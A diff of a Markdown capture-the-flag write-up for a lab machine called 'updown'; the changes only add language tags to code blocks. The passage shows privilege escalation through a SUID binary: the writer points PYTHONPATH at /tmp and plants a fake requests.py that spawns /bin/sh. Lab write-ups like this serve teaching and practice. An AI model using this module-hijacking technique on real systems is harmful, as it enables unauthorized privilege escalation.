@@ -289,13 +289,13 @@ The binary is a SUID binary owned by the user `developer` so if we can control t
 
 Checking a bit the Python [documentation](https://docs.python.org/2/tutorial/modules.html#the-module-search-path){:target="_blank"}, I found that before checking for installed modules in the typical installation directories, Python will try to check both the current directory and also the `PYTHONPATH` environment variable trying to find the requested module. We can't write in the directory where this script is located but we can set that environment variable and point it to a directory we control:
 
-```
+```bash
 export PYTHONPATH=/tmp
 ```
 
 Now we create a file called `requests.py` in the `/tmp` directory with this content:
 
-```
+```python
 import pty
 
 pty.spawn("/bin/sh")
@@ -303,7 +303,7 @@ pty.spawn("/bin/sh")
 
 Everythinng is ready now, we can execute the binary to start impersonating the `developer` user!
 
-```
+```bash
 www-data@updown:/tmp$ /home/developer/dev/siteisup
 Welcome to 'siteisup.htb' application
 
